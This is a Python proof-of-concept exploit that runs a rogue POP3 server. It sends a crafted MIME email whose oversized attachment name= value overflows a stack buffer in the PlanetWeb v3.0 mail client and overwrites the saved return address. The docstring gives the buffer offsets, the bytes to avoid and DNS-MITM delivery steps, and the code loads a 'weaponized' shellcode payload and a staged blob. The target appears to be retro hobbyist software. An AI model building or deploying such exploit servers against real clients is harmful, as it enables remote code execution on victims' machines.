#!/usr/bin/env python3
"""
mail_poc.py -- TARGETED PoC POP3 server for the PlanetWeb v3.0 native MIME-attachment
stack overflow in fn_application_x_dreamcas (0x8C04669C).

The bug: parsing a multipart part with  Content-Type: image/...; name="VALUE"
the handler copies VALUE byte-by-byte into a 64-byte stack buffer (r15+0x10),
stopping only on '"' / ' ' / NUL in the input. Saved PR is at r15+0x50, i.e.
0x40 (64) bytes above the buffer -> a VALUE of  PAD(64) + 4-byte addr  overwrites
the function's saved return address. No canary, no ASLR -> direct PC control.

This serves ONE message: a clean multipart/mixed with a single image/gif part whose
name= is the overflow payload. Boundary is CONSISTENT (declared == delimiter), unlike
the fuzzer. Point the browser's POP3 host here (DNS MITM) and hit "Check Mail".

Knobs (env or args):
  MAIL_PAD  (default 64)        bytes before the saved-PR slot
  MAIL_PC   (default AABBCCDD)  4-byte value (hex) written over saved PR (little-endian)
                               -- a recognizable marker for live GDB confirmation.
  --pop     (default 110)

Payload bytes avoid 0x22('"') 0x20(' ') 0x00 which would truncate the copy early.
"""
import argparse, os, socket, threading, sys, time, struct

PAD = int(os.environ.get("MAIL_PAD", "64"))
PC  = int(os.environ.get("MAIL_PC", "AABBCCDD"), 16)
RETR_DELAY = float(os.environ.get("MAIL_RETR_DELAY", "2.5"))  # hold body after RETR so staging lands
LOG = sys.stderr

UID = str(int(time.time()))
def log(m): LOG.write("    [mailpoc] " + m + "\n"); LOG.flush()

def name_payload():
    pf = os.path.join(os.path.dirname(os.path.abspath(__file__)), "name_payload.hex")
    if os.path.exists(pf):                 # file-driven payload (update without restart)
        hx = open(pf).read().strip()
        if hx:
            b = bytes.fromhex(hx)
            bad = [i for i,x in enumerate(b) if x in set(b'\x00\x20\x22')]
            if bad: log("WARNING: name_payload.hex copy-terminating bytes at %s" % bad[:5])
            log("using name_payload.hex (%d bytes)" % len(b))
            return b
    hx = os.environ.get("MAIL_NAME_HEX")
    if hx:                                 # exact weaponized payload (pad+PR+sled+stub)
        b = bytes.fromhex(hx)
        bad = [i for i,x in enumerate(b) if x in set(b'\x00\x20\x22')]
        if bad: log("WARNING: MAIL_NAME_HEX has copy-terminating bytes at %s" % bad[:5])
        log("using MAIL_NAME_HEX payload (%d bytes)" % len(b))
        return b
    pc = struct.pack("<I", PC)            # little-endian SH-4
    bad = set(b'\x00\x20\x22')
    if any(b in bad for b in pc):
        log("WARNING: MAIL_PC=%08X contains a copy-terminating byte (00/20/22) -> will truncate" % PC)
    return b"A" * PAD + pc                 # 64 pad + 4-byte saved-PR overwrite

def gif_body():
    # minimal 1x1 GIF89a so the part has plausible image bytes (overflow is in the
    # header name= parse, before any image decode, so content barely matters)
    return (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff"
            b"!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")

def build_message():
    nm = name_payload()
    body = gif_body()
    # CRLF line-structured RFC822 + MIME multipart. Consistent boundary "BND".
    parts = []
    parts.append(b"From: attacker@evil.example <a@b>")
    parts.append(b"To: victim@planetweb.com")
    _sf=os.path.join(os.path.dirname(os.path.abspath(__file__)),"mail_subject.txt")
    _subj=open(_sf).read().strip() if os.path.exists(_sf) else "hi"
    parts.append(b"Subject: "+_subj.encode())
    parts.append(b"MIME-Version: 1.0")
    parts.append(b'Content-Type: multipart/mixed; boundary="BND"')
    parts.append(b"")
    # BLOB FIRST so it is fully downloaded before the overflow part is parsed
    # (the browser parses incrementally; overflow must fire AFTER the blob arrives).
    bf = os.path.join(os.path.dirname(os.path.abspath(__file__)), "doom_blob.txt")
    if os.path.exists(bf):
        blob = open(bf, "rb").read().strip()
        parts.append(b"--BND")
        parts.append(b"Content-Type: application/octet-stream")
        parts.append(b"")
        for i in range(0, len(blob), 8000):
            parts.append(blob[i:i+8000])
        log("carried blob: %d bytes (%d lines)" % (len(blob), (len(blob)+75)//76))
    # the overflow part LAST: image/ content-type with the oversized name=
    parts.append(b"--BND")
    parts.append(b'Content-Type: image/gif; name="' + nm + b'"')
    parts.append(b"")
    parts.append(body)
    parts.append(b"--BND--")
    return b"\r\n".join(parts) + b"\r\n"

MSG = build_message()

def pop3(conn, addr):
    MSG = build_message()   # rebuild per-connection (live payload)
    f = conn.makefile("rwb", buffering=0)
    def send(s):
        if isinstance(s, str): s = s.encode("latin1", "ignore")
        f.write(s + b"\r\n")
    try:
        send("+OK PlanetWeb PoP3 ready")
        while True:
            line = f.readline()
            if not line: break
            cmd = line.strip().split(b" ", 1)[0].upper()
            log("<= %r" % line[:50])
            if   cmd == b"USER": send("+OK user")
            elif cmd == b"PASS": send("+OK 1 message")
            elif cmd == b"CAPA": send("+OK"); send("UIDL"); send("TOP"); send(".")
            elif cmd == b"STAT": send("+OK 1 %d" % len(MSG))
            elif cmd == b"LIST": send("+OK 1 message"); send("1 %d" % len(MSG)); send(".")
            elif cmd == b"UIDL": send("+OK"); send("1 POC"+UID); send(".")
            elif cmd == b"TOP":
                send("+OK top");
                for ln in MSG.split(b"\r\n"):
                    if ln == b"": break
                    f.write((b".." if ln.startswith(b".") else ln) + b"\r\n")
                send(""); send(".")
            elif cmd == b"RETR":
                send("+OK %d octets" % len(MSG))
                log(">>> RETR received -- staging window open (delaying body %.1fs)" % RETR_DELAY)
                # The 315-byte body renders the instant it arrives, faster than the ~1s
                # GDB staging. If the demo staged on TOP (preview) the stub is already
                # planted; but if the client opened DIRECTLY (no preview), hold the body
                # briefly so the demo -- which triggers on this RETR log line -- finishes
                # planting the stub before the overflow renders.
                time.sleep(RETR_DELAY)
                log(">>> sending crafted message (%d bytes) in big chunks" % len(MSG))
                # dot-stuff (no-op for our hex/MIME lines) then send in 64KB chunks (fast)
                stuffed=b"\r\n".join((b"."+ln if ln.startswith(b".") else ln) for ln in MSG.split(b"\r\n"))
                for i in range(0,len(stuffed),65536): f.write(stuffed[i:i+65536])
                f.write(b"\r\n.\r\n")
            elif cmd == b"DELE": send("+OK")
            elif cmd == b"NOOP": send("+OK")
            elif cmd == b"QUIT": send("+OK bye"); break
            else: send("+OK")
    except Exception as e:
        log("conn closed: %s" % e)
    finally:
        try: conn.close()
        except: pass

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--pop", type=int, default=110)
    args = ap.parse_args()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", args.pop)); s.listen(8)
    log("rogue PoC POP3 on :%d | name= payload %d bytes (PAD=%d + PC=0x%08X)"
        % (args.pop, PAD + 4, PAD, PC))
    log("message bytes=%d ; point browser POP3 host here + Check Mail" % len(MSG))
    while True:
        c, a = s.accept(); log("<<< connection from %s" % (a,))
        threading.Thread(target=pop3, args=(c, a), daemon=True).start()
